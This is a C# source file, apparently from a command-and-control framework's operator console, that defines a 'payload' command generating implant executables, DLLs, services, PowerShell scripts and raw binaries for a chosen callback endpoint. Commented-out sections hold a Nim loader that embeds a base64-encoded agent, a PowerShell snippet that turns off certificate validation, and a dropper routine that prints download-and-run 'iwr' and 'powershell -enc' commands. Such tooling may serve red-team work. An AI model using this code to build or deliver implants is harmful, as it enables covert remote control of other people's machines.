using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Text.RegularExpressions;
using Common;
using Common.Payload;

namespace Commander.Commands.Laucher
{
    public class BuildPayloadCommandOptions
    {

        public string endpoint { get; set; }
        //public string url { get; set; }

        public string fileName { get; set; }
        public string path { get; set; }

        public bool debug { get; set; }

        //public bool webhost { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }

        public string serverKey { get; set; }

        public string type { get; set; }
    }
    public class BuildPayloadCommand : EnhancedCommand<BuildPayloadCommandOptions>
    {
        //public static string PowershellSSlScript  = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";

        public override string Category => CommandCategory.Core;
        public override string Description => "Create a payload file";
        public override string Name => "payload";

        public override ExecutorMode AvaliableIn => ExecutorMode.All;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("endpoint", "endpoint to connect to"),
            //new Option<string>(new[] { "--url", "-u" }, () => null, "url to download stage from"),
            new Option<string>(new[] { "--type", "-t" }, () => "exe" ,"exe | dll | svc | ps | bin | all").FromAmong("exe", "dll", "svc", "ps", "bin", "all"),
            new Option<string>(new[] { "--fileName", "-f" }, () => null ,"Name of the file to be crafted"),
            new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
            new Option<string>(new[] { "--path", "-p" }, () => null, "Folder to save the generated file"),
            new Option<string>(new[] { "--serverKey", "-k" }, () => null, "The server unique key of the endpoint"),
            //new Option(new[] { "--webhost", "-wh" }, "Host the payload on the agent Web Host"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<BuildPayloadCommandOptions> context)
        {

            var agent = context.Executor.CurrentAgent;
            var endpoint = ConnexionUrl.FromString(context.Options.endpoint);
            if (!endpoint.IsValid)
            {
                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            /*var url = context.Options.url;
            int urlPort = 80;
            if (string.IsNullOrEmpty(url))
            {
                if (endpoint.Protocol == ConnexionType.Http)
                {
                    url = endpoint.ToString();
                }
                else
                {   //it's a pivot webhost should be running on it
                    url = "http://" + endpoint.Address + $":{urlPort}/wh/";
                }

                context.Terminal.WriteLine($"[X] Url was not specified, using {url} !");
            }

            try
            {
                Uri uri = new Uri(url);
                urlPort = uri.Port;
            }
            catch (Exception ex)
            {
                //context.Terminal.WriteLine(ex.ToString());
            }

            url += "/wh/";
            */
            if (context.Options.type == "all")
            {
                foreach (var arch in Enum.GetValues(typeof(PayloadArchitecture)))
                {
                    var archType = (PayloadArchitecture)arch;
                    foreach (var typ in Enum.GetValues(typeof(PayloadType)))
                    {
                        var payType = (PayloadType)typ;

                        var options = new PayloadGenerationOptions()
                        {
                            Architecture = archType,
                            Endpoint = endpoint,
                            IsDebug = context.Options.debug,
                            IsVerbose = context.Options.verbose,
                            ServerKey = context.Options.serverKey,
                            Type = payType
                        };

                        this.GeneratePayload(context, options);
                    }
                }
            }
            else
            {
                var t = PayloadType.Executable;
                switch (context.Options.type)
                {
                    case "dll": t = PayloadType.Library; break;
                    case "svc": t = PayloadType.Service; break;
                    case "ps": t = PayloadType.PowerShell; break;
                    case "bin": t = PayloadType.Binary; break;
                    default: break;
                }

                var options = new PayloadGenerationOptions()
                {
                    Architecture = context.Options.x86 ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                    Endpoint = endpoint,
                    IsDebug = context.Options.debug,
                    IsVerbose = context.Options.verbose,
                    ServerKey = context.Options.serverKey,
                    Type = t
                };

                return this.GeneratePayload(context, options);

            }


            /* var outFile = context.Options.fileName;
             if (string.IsNullOrEmpty(outFile))
             {
                 outFile = "payload_" + endpoint.ProtocolString + "_" + Regex.Replace(endpoint.Address, @"[^\w\s]", "_");
             }

             if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                 outFile += ".exe";

             string outPath = Path.Combine(context.Config.PayloadConfig.DefaultOutpath, outFile);
             if (!string.IsNullOrEmpty(context.Options.path))
                 outPath = Path.Combine(context.Options.path, outFile);

             context.Terminal.WriteLine($"[>] Generating payload...");

             var generator = new PayloadGenerator(context.Config.PayloadConfig.Source);
             generator.MessageSent += (object sender, string msg) => { if (context.Options.verbose) context.Terminal.WriteLine(msg); };

             try
             {
                 var bytes = generator.GeneratePayload();
                 string agentb64 = Convert.ToBase64String(bytes);
                 //File.WriteAllBytes(outPath, bytes);
                 string nimSourceCode = string.Empty;
                 using (var nimReader = new StreamReader(Path.Combine(context.Config.PayloadConfig.Source, "payload.nim")))
                 {
                     nimSourceCode = nimReader.ReadToEnd();
                 }

                 var payload = new StringBuilder();
                 foreach (var chunk in BuildHelper.SplitIntoChunks(agentb64, 1000))
                 {
                     payload.Append("b64 = b64 & \"");
                     payload.Append(chunk);
                     payload.Append("\"");
                     payload.Append(Environment.NewLine);
                 }

                 var nimFile = "tmp" + ShortGuid.NewGuid();
                 nimSourceCode = nimSourceCode.Replace("[[PAYLOAD]]", payload.ToString());

                 var nimPath = Path.Combine(context.Config.PayloadConfig.SourceFolder, nimFile + ".nim");
                 using (var writer = new StreamWriter(nimPath))
                 {
                     writer.WriteLine(nimSourceCode);
                 }


                 var parms = BuildHelper.ComputeNimBuildParameters(nimPath, outPath, context.Options.debug, false);

                 if (context.Options.x86)
                     parms.Insert(3, $"--cpu:i386");
                 else
                     parms.Insert(3, $"--cpu:amd64");


                 context.Terminal.WriteLine($"[>] Generating executable...");

                 if (context.Options.verbose)
                     context.Terminal.WriteLine($"[>] Executing: nim {string.Join(" ", parms)}");
                 var executionResult = BuildHelper.NimBuild(parms);

                 if (context.Options.verbose)
                     context.Terminal.WriteLine(executionResult.Out);

                 File.Delete(Path.Combine(context.Config.PayloadConfig.Source, nimFile + ".nim"));

                 if (executionResult.Result != 0)
                 {
                     context.Terminal.WriteError($"[X] Build Failed!");
                     return false;
                 }
             }
             catch (Exception ex)
             {
                 context.Terminal.WriteError($"[X] Build Failed!");
                 if (context.Options.verbose)
                     context.Terminal.WriteError(ex.ToString());
                 return false;
             }

             context.Terminal.WriteSuccess($"[*] Build succeed.");
             context.Terminal.WriteInfo($"Payload can be found at {outPath}");*/


            /* if (context.Options.webhost)
             {

                 byte[] fileContent = File.ReadAllBytes(outPath);
                 await WebHostCommand.PushFile(context, outFile, fileContent);

                 string urlwh = $"{url}{outFile}";
                 context.Terminal.WriteLine($"[*] dropper hosted on : {urlwh}");

                 string script = $"iwr -Uri '{urlwh}' -OutFile '{outFile}'; .\\{outFile}";

                 string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

                 //string encoded = Encoding.UTF8.GetString(utf8String)
                 context.Terminal.WriteLine($"[>] Command : powershell -c \"{script}\"");
                 context.Terminal.WriteLine($"[>] Command : powershell -enc {enc64}");
             }*/

            return true;
        }

        private bool GeneratePayload(CommandContext<BuildPayloadCommandOptions> context, PayloadGenerationOptions options)
        {
            context.Terminal.WriteInfo($"[>] Generating Payload {options.Type} for Endpoint {options.Endpoint} (arch = {options.Architecture}).");
            byte[] pay;
            try
            {
                var generator = new PayloadGenerator(context.Config.PayloadConfig);
                generator.MessageSent += (object sender, string msg) => { if (context.Options.verbose) context.Terminal.WriteLine(msg); };
                pay = generator.GeneratePayload(options);
            }
            catch (Exception ex)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                if (context.Options.verbose)
                    context.Terminal.WriteError(ex.ToString());
                return false;
            }

            if (pay == null)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                return false;
            }

            var outPath = GetOutputFilePath(context, options);
            File.WriteAllBytes(outPath, pay);

            context.Terminal.WriteSuccess($"[*] Generation succeed.");
            context.Terminal.WriteInfo($"Payload can be found at {outPath}");
            return true;
        }


        private string GetOutputFilePath(CommandContext<BuildPayloadCommandOptions> context, PayloadGenerationOptions options)
        {

            var customFileName = !string.IsNullOrEmpty(context.Options.fileName);
            var outFile = string.Empty;
            if (!customFileName)
                outFile = "payload_" + options.Endpoint.ProtocolString + "_" + System.Text.RegularExpressions.Regex.Replace(options.Endpoint.Address, @"[^\w\s]", "_");
            else
                outFile = Path.GetFileNameWithoutExtension(context.Options.fileName);

            if (options.Type == PayloadType.Service && (context.Options.type == "all" || !customFileName))
                outFile += "_svc";

            if (context.Options.type == "all")
                outFile += options.Architecture == PayloadArchitecture.x86 ? "_x86" : "_x64";

            switch (options.Type)
            {
                case PayloadType.Executable:
                case PayloadType.Service:
                    if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                        outFile += ".exe";
                    break;
                case PayloadType.Library:
                    if (!Path.GetExtension(outFile).Equals(".dll", StringComparison.OrdinalIgnoreCase))
                        outFile += ".dll";
                    break;
                case PayloadType.PowerShell:
                    if (!Path.GetExtension(outFile).Equals(".ps1", StringComparison.OrdinalIgnoreCase))
                        outFile += ".ps1";
                    break;
                case PayloadType.Binary:
                    if (!Path.GetExtension(outFile).Equals(".bin", StringComparison.OrdinalIgnoreCase))
                        outFile += ".bin";
                    break;
            }

            string outPath = Path.Combine(context.Config.PayloadConfig.OutputFolder, outFile);
            if (!string.IsNullOrEmpty(context.Options.path))
                outPath = Path.Combine(context.Options.path, outFile);

            return outPath;
        }
    }

}
